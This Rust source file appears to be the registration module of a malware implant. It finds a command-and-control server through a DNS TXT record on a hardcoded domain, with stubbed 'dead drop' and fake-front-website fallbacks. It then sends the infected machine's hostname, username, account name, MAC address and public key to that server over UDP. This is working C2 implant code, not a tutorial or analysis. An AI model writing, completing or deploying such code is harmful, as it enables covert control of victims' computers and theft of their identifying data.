use crate::{
    identity::Identity,
    registration::{
        errors::{
            DeadDropReachError, DnsReachError, ReachError, RegistrationError, WebsiteReachError,
        },
        types::{ReachCommMode, ReachInfo},
    },
};
use hickory_resolver::Resolver;
use std::net::Ipv4Addr;
use tokio::net::UdpSocket;
use tokio::time::{Duration, timeout};

mod errors;
mod types;

/**
 * The process of reaching the C2 for the first time, registering the node and establishing a mode of operation.
 */

pub async fn run(identity: &Identity) -> Result<(), RegistrationError> {
    let reach_info = reach_c2().await?;

    match reach_info.comm_mode {
        ReachCommMode::HTTP => register_self_http(&reach_info, identity).await?,
        ReachCommMode::UDP => register_self_udp(&reach_info, identity).await?,
    };

    Ok(())
}

async fn register_self_http(
    reach_info: &ReachInfo,
    identity: &Identity,
) -> Result<(), RegistrationError> {
    let _ = (reach_info, identity);
    Err(RegistrationError::Unknown("Not yet implemented".into()))
}

async fn register_self_udp(
    reach_info: &ReachInfo,
    identity: &Identity,
) -> Result<(), RegistrationError> {
    let remote_addr =
        std::net::SocketAddr::new(std::net::IpAddr::V4(reach_info.ipv4), reach_info.port);

    let sock = UdpSocket::bind("0.0.0.0:0")
        .await
        .map_err(|err| RegistrationError::Connection(err))?;
    timeout(Duration::from_secs(10), sock.connect(remote_addr))
        .await
        .map_err(|_| RegistrationError::Timeout("Timed out connecting to c2 udp".into()))?
        .map_err(|err| RegistrationError::Connection(err))?;

    let mut reg_buf: Vec<u8> = Vec::new();
    reg_buf.extend_from_slice(&[77, 33, 1]);

    let write_string = |buf: &mut Vec<u8>, s: &str| {
        let bytes = s.as_bytes();
        let len = bytes.len() as u16;
        buf.extend_from_slice(&len.to_be_bytes());
        buf.extend_from_slice(bytes);
    };

    let write_optional_string = |buf: &mut Vec<u8>, opt: &Option<String>| match opt {
        Some(s) => write_string(buf, s),
        None => buf.extend_from_slice(&0u16.to_be_bytes()),
    };

    reg_buf.extend_from_slice(&base85::decode(&identity.nodus_id).unwrap());
    
    // Write MAC address as 6 raw bytes
    if let Some(m) = &identity.mac_addr {
        let mac_bytes: Vec<u8> = m.split(':')
            .filter_map(|hex| u8::from_str_radix(hex, 16).ok())
            .collect();
        if mac_bytes.len() == 6 {
            reg_buf.extend_from_slice(&mac_bytes);
        } else {
            reg_buf.extend_from_slice(&[0, 0, 0, 0, 0, 0]);
        }
    } else {
        reg_buf.extend_from_slice(&[0, 0, 0, 0, 0, 0]);
    }

    reg_buf.extend_from_slice(&[1]);
    let public_key = identity.asym_sec.get_public_key();
    let public_key_len = public_key.len() as u16;
    reg_buf.extend_from_slice(&public_key_len.to_be_bytes());
    reg_buf.extend_from_slice(&public_key);

    write_string(&mut reg_buf, &identity.cpu_arch);
    write_optional_string(&mut reg_buf, &identity.hostname);
    write_optional_string(&mut reg_buf, &identity.username);
    write_optional_string(&mut reg_buf, &identity.device_name);
    write_optional_string(&mut reg_buf, &identity.account_name);

    timeout(Duration::from_secs(10), sock.send(&reg_buf))
        .await
        .map_err(|_| RegistrationError::Timeout("Timed out sending registration payload".into()))?
        .map_err(|err| RegistrationError::Communication(err))?;

    let mut ack_buf = [0u8; 16];
    let bytes_received = timeout(Duration::from_secs(10), sock.recv(&mut ack_buf))
        .await
        .map_err(|_| RegistrationError::Timeout("Timed out waiting for registration ack".into()))?
        .map_err(|err| RegistrationError::Communication(err))?;

    if bytes_received == 0 {
        return Err(RegistrationError::ServerSilence);
    }

    if bytes_received < 3 || &ack_buf[..3] != b"ACK" {
        return Err(RegistrationError::Unknown(
            "Invalid acknowledgement from C2".into(),
        ));
    }

    Ok(())
}

async fn reach_c2() -> Result<ReachInfo, ReachError> {
    // DNS
    match find_c2_dns().await {
        Ok(info) => Ok(info),
        Err(dns_err) => {
            eprintln!("C2 reach via DNS failed: {dns_err}");

            // DEAD DROP
            match find_c2_deaddrop().await {
                Ok(info) => Ok(info),
                Err(deaddrop_err) => {
                    eprintln!("C2 reach via deaddrop failed: {deaddrop_err}");

                    // WEBSITE
                    match find_c2_website().await {
                        Ok(info) => Ok(info),
                        Err(website_err) => {
                            eprintln!("C2 reach via website failed: {website_err}");

                            // ALL FAILED
                            return Err(ReachError::AllMethodsFailed {
                                dns: dns_err,
                                deaddrop: deaddrop_err,
                                website: website_err,
                            });
                        }
                    }
                }
            }
        }
    }
}

async fn find_c2_dns() -> Result<ReachInfo, DnsReachError> {
    let resolver = Resolver::builder_tokio()?.build();
    let result = resolver.txt_lookup("korf.elstadt.com").await?;

    let first_record = result.iter().next().ok_or(DnsReachError::MissingRecord)?;
    let txt_data = first_record
        .txt_data()
        .first()
        .ok_or(DnsReachError::MissingRecord)?;

    /*
        IPv4 address: 4 bytes
        Port: 2 bytes
        Comm mode: 1 byte
            -> 0x00 = http
            -> 0x01 = udp
    */
    let bytes =
        base85::decode(str::from_utf8(txt_data)?).map_err(|_| DnsReachError::BadBase85Encoding)?;
    let bytes_len = bytes.len();

    if bytes_len < 7 {
        return Err(DnsReachError::PayloadTooShort(bytes_len));
    }

    Ok(ReachInfo {
        ipv4: Ipv4Addr::new(bytes[0], bytes[1], bytes[2], bytes[3]),
        port: u16::from_be_bytes([bytes[4], bytes[5]]),
        comm_mode: match bytes[6] {
            0x00 => ReachCommMode::HTTP,
            0x01 => ReachCommMode::UDP,
            b => return Err(DnsReachError::UnknownCommMode(b)),
        },
    })
}

async fn find_c2_deaddrop() -> Result<ReachInfo, DeadDropReachError> {
    Err(DeadDropReachError::Unknown("Not implemented".into())) // todo: look inside some deaddrop: discord, yt, x or whatever
}

async fn find_c2_website() -> Result<ReachInfo, WebsiteReachError> {
    Err(WebsiteReachError::Unknown("Not implemented".into())) // todo: request to some fake front website for the reach info
}
